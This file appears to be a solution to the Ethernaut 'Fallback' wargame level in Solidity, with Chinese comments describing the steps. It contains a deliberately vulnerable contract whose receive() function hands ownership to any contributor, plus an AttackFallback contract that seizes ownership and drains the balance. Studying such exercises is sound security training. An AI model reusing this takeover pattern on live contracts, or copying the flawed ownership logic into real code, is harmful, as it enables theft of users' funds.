// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//1、调用contribute使contributions[msg.sender]>0
//2、给Fallback转账，使合约调用receive函数拿到owner
//3、调用withdraw
contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;
    address public attacker;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() payable public  {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}

contract AttackFallback {
    Fallback public target;
    address public owner;

    constructor(Fallback _target) payable {
        owner = msg.sender;
        target = _target;
    }

    function depoist() public payable {
       // target.contribute.value(msg.value)(msg.sender);
        target.contribute{value: msg.value}();
    }

    function attack() external payable {
        //selfdestruct(payable(address(target)));
        address(target).call{value: msg.value}("");
    }

    function withdrawAttack() public {
        target.withdraw();
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
    }
}